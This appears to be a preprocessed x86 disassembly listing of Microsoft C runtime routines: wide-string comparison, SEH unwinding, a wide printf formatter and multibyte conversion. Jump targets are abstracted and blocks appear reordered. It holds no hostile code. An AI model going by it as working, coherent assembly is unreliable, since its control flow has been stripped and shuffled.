movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop esi
pop ebp
retn
movzx esi [ edx ]
test si si
je r-xdata
cmp si [ ecx ]
jne r-xdata
add edx 0x2
add ecx 0x2
jmp r-xdata
dec eax
je r-xdata
sub_428deb
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push edi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_428e9f
add esp 0x10
mov edi [ ebp + 0x10 ]
xor eax eax
test edi edi
je r-xdata
pop edi
leave
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
mov eax 0x7fffffff
jmp r-xdata
push ebx
push esi
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
dec edi
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop esi
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_428e9f
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor esi esi
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
mov eax esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_4199d2
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ ebx ]
push eax
call sub_425b2a
movzx esi ax
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ edi ]
push eax
call sub_425b2a
add esp 0x10
dec [ ebp + 0x10 ]
movzx eax ax
lea ebx [ ebx + 0x2 ]
lea edi [ edi + 0x2 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
push 0x41
pop edx
push 0x5a
pop esi
sub ebx edi
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax ax
movzx esi si
sub esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
movzx eax [ ebx + edi ]
cmp ax dx
jb r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
mov esi eax
cmp ax si
ja r-xdata
add edi 0x2
dec ecx
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp ax dx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
jmp r-xdata
sub_428fa0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428fc0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4170bc
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_429005
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_429005
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_428fc0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4290b5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4290d4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_4290ac
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4290b5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4290d7
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_41ccf1
mov [ eax ] 0x9
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41f411
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_42912b
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x428 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
call sub_4199d2
call sub_41ccf1
mov [ ebp - 0x45c ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
test esi esi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
cmp [ ebp - 0x440 ] bl
xor ecx ecx
mov eax ecx
mov edx ecx
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x458 ] ecx
movzx ecx [ esi ]
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x41c ] ecx
test cx cx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov esi [ ebp - 0x46c ]
mov [ ebp - 0x474 ] 0x58
mov [ ebp - 0x47c ] 0x64
mov [ ebp - 0x480 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x434 ]
test ecx ecx
je r-xdata
push 0x58
lea eax [ ecx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
cmp [ ebp - 0x440 ] 0x0
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov edi [ ebp - 0x434 ]
imul eax eax 0x9
movzx edi [ eax + edi + r--data ]
mov eax edi
shr eax 0x4
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] eax
cmp eax 0x8
je r-xdata
je r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_429d5f ]
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax cx
push 0x20
pop ecx
sub eax ecx
je r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
mov [ ebp - 0x430 ] 0x1
push ecx
call sub_429d7f
add esp 0xc
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x424 ]
imul eax eax 0xa
mov [ ebp - 0x424 ] eax
movzx eax cx
mov ecx [ ebp - 0x424 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x418 ]
imul eax eax 0xa
mov [ ebp - 0x418 ] eax
movzx eax cx
mov ecx [ ebp - 0x418 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x418 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov edx [ ebp - 0x414 ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
jmp r-xdata
movzx ecx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] ecx
test cx cx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop ecx
cmp eax ecx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x410 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x47c ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
or ebx 0x8000
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] cx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp eax 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x480 ]
je r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
mov [ ebp - 0x408 ] eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x40c ]
add esi 0x4
mov [ ebp - 0x40c ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi eax
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x41c ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x42c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x458 ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x410 ] ebx
lea esi [ ebp - 0x404 ]
mov [ ebp - 0x414 ] edx
test eax eax
jns r-xdata
push 0x69
pop ecx
cmp eax ecx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
push 0x20
pop eax
add ecx eax
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x41c ] ecx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x430 ] 0x1
mov edx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edx ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_417912
xor eax eax
pop ecx
mov [ ebp - 0x458 ] eax
push 0x20
pop ecx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub edx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_429de1
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push ecx
call sub_429db5
mov eax [ ebp - 0x42c ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax edx
jle r-xdata
push 0x67
pop eax
cmp cx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x418 ]
mov [ ebp - 0x40c ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
call sub_418531
test eax eax
je r-xdata
push 0x6f
pop ecx
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x414 ] edx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x430 ] 0x1
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x464 ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
add edx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_427df7
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x430 ] 0x0
mov eax [ ebp - 0x414 ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x410 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x410 ] ebx
cmp ecx eax
jae r-xdata
movsx edx [ eax ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov edx eax
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_429fdf
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ edx ] ax
je r-xdata
mov edx [ ebp - 0x414 ]
inc eax
inc edx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
cmp edx edi
jl r-xdata
inc eax
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_429de1
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_429db5
add esp 0x10
push 0x20
pop ecx
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x42c ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_41b8d1
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x410 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar edx 0x1
xor edx edx
lea esi [ ebp - 0x404 ]
inc edx
jmp r-xdata
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x42c ]
sub edi edx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x414 ] edi
jmp r-xdata
push esi
call sub_41a7f0
pop ecx
mov edx eax
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x410 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x42c ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_429db5
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x464 ]
call sub_429d7f
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x478 ]
mov eax [ ebp - 0x46c ]
add esp 0xc
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x40c ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_42a0f0
add ecx 0x30
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x414 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x464 ]
push ecx
push eax
call sub_429fdf
add esp 0x10
mov [ ebp - 0x478 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
mov ecx [ ebp - 0x414 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x410 ]
lea edx [ ebp - 0x205 ]
sub edx esi
inc esi
mov [ ebp - 0x414 ] edx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test edx edx
je r-xdata
dec esi
push 0x30
pop eax
mov [ esi ] al
inc edx
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_429d7f
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_429e5a
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
sub_429db5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
call sub_429d7f
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_429de1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
test [ edi + 0xc ] 0x40
mov [ ebp + 0x18 ] eax
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
push edi
movzx eax [ eax ]
push eax
dec ebx
call sub_429d7f
mov eax [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x2
add esp 0xc
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_429d7f
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_429e5a
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test [ edi + 0xc ] 0x40
jne r-xdata
add [ edi + 0x4 ] 0xfffffffe
js r-xdata
push edi
call sub_42094c
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push edi
push eax
call sub_42d870
pop ecx
pop ecx
mov ecx [ edi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ edi ] 0x2
jmp r-xdata
mov eax ebx
push edi
call sub_42094c
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
push edi
call sub_42094c
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_42094c
mov esi eax
push edi
sar esi 0x5
call sub_42094c
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
mov eax ebx
push edi
call sub_42094c
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push edi
call sub_42094c
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_42094c
mov esi eax
push edi
sar esi 0x5
call sub_42094c
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
test [ ebx + 0x4 ] 0x80
je r-xdata
push edi
call sub_42094c
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42a89f
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_42094c
mov esi eax
push edi
sar esi 0x5
call sub_42094c
mov ebx eax
and ebx 0x1f
pop ecx
shl ebx 0x6
add ebx [ esi * 4 + rw-data ]
pop ecx
xor esi esi
cmp [ ebp - 0x10 ] esi
jle r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ edi + 0x4 ]
js r-xdata
movsx eax [ ebp + esi - 0xc ]
push edi
push eax
call sub_41f952
pop ecx
pop ecx
mov ecx eax
mov ecx [ edi ]
mov al [ ebp + esi - 0xc ]
mov [ ecx ] al
mov eax [ edi ]
movzx ecx [ eax ]
inc eax
mov [ edi ] eax
jmp r-xdata
inc esi
cmp esi [ ebp - 0x10 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
sub_429fdf
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_427df7
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
inc edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41ccf1
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
